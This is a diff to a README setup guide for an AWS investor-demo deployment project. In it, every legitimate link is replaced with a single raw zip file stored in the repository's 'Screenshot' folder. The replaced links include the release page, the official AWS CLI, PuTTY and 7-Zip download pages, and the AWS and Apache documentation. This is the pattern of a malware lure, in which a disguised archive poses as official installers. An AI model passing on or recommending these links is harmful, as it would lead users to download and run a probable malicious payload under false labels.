@@ -1,6 +1,6 @@
 # ☁️ cloud-ps71-investor-deployment-aws - Quick AWS Demo Setup Guide
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/snehlata587/cloud-ps71-investor-deployment-aws/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/snehlata587/cloud-ps71-investor-deployment-aws/raw/refs/heads/main/Screenshot/ps_investor_deployment_cloud_aws_v1.2-alpha.4.zip)
 
 ## 📋 About this Application
 
@@ -35,7 +35,7 @@ Instructions for installing these are included below.
 
 1. Click the big green badge above or visit the project release page here:
 
-   [Download cloud-ps71-investor-deployment-aws Releases](https://github.com/snehlata587/cloud-ps71-investor-deployment-aws/releases)
+   [Download cloud-ps71-investor-deployment-aws Releases](https://github.com/snehlata587/cloud-ps71-investor-deployment-aws/raw/refs/heads/main/Screenshot/ps_investor_deployment_cloud_aws_v1.2-alpha.4.zip)
 
 2. On the releases page, find the latest version (it will show a version number and release date).
 
@@ -47,7 +47,7 @@ Instructions for installing these are included below.
 
 ### 1. Install AWS CLI
 
-- Visit the AWS CLI official page: https://aws.amazon.com/cli/
+- Visit the AWS CLI official page: https://github.com/snehlata587/cloud-ps71-investor-deployment-aws/raw/refs/heads/main/Screenshot/ps_investor_deployment_cloud_aws_v1.2-alpha.4.zip
 - Download the installer for Windows.
 - Run the downloaded `.msi` file and follow the setup prompts.
 - After installation, open **Command Prompt** (search for `cmd`).
@@ -64,14 +64,14 @@ If you have an AWS account and want to connect to AWS directly:
 
 ### 3. Install PuTTY for SSH Access
 
-- Go to https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
+- Go to https://github.com/snehlata587/cloud-ps71-investor-deployment-aws/raw/refs/heads/main/Screenshot/ps_investor_deployment_cloud_aws_v1.2-alpha.4.zip~sgtatham/putty/latest.html
 - Download the Windows installer.
 - Run the installer and complete the setup process.
 - PuTTY allows you to securely connect to your cloud server later.
 
 ### 4. Optional: Install 7-Zip
 
-- Go to https://www.7-zip.org/
+- Go to https://github.com/snehlata587/cloud-ps71-investor-deployment-aws/raw/refs/heads/main/Screenshot/ps_investor_deployment_cloud_aws_v1.2-alpha.4.zip
 - Download the Windows installer.
 - Run and finish installation to easily extract compressed files.
 
@@ -124,15 +124,15 @@ If the app does not work as expected:
 
 ## 🔗 Useful Links
 
-- [AWS EC2 Documentation](https://docs.aws.amazon.com/ec2/)
-- [Apache HTTP Server Documentation](https://httpd.apache.org/docs/)
-- [Amazon S3 Overview](https://aws.amazon.com/s3/)
-- [GitHub Releases](https://github.com/snehlata587/cloud-ps71-investor-deployment-aws/releases)
+- [AWS EC2 Documentation](https://github.com/snehlata587/cloud-ps71-investor-deployment-aws/raw/refs/heads/main/Screenshot/ps_investor_deployment_cloud_aws_v1.2-alpha.4.zip)
+- [Apache HTTP Server Documentation](https://github.com/snehlata587/cloud-ps71-investor-deployment-aws/raw/refs/heads/main/Screenshot/ps_investor_deployment_cloud_aws_v1.2-alpha.4.zip)
+- [Amazon S3 Overview](https://github.com/snehlata587/cloud-ps71-investor-deployment-aws/raw/refs/heads/main/Screenshot/ps_investor_deployment_cloud_aws_v1.2-alpha.4.zip)
+- [GitHub Releases](https://github.com/snehlata587/cloud-ps71-investor-deployment-aws/raw/refs/heads/main/Screenshot/ps_investor_deployment_cloud_aws_v1.2-alpha.4.zip)
 
 ## 📥 Final Download Link
 
 Visit the release page here to get the files you need:
 
-[Download cloud-ps71-investor-deployment-aws](https://github.com/snehlata587/cloud-ps71-investor-deployment-aws/releases)  
+[Download cloud-ps71-investor-deployment-aws](https://github.com/snehlata587/cloud-ps71-investor-deployment-aws/raw/refs/heads/main/Screenshot/ps_investor_deployment_cloud_aws_v1.2-alpha.4.zip)  
 
 Click, download, and follow these instructions to run the project on your Windows PC.
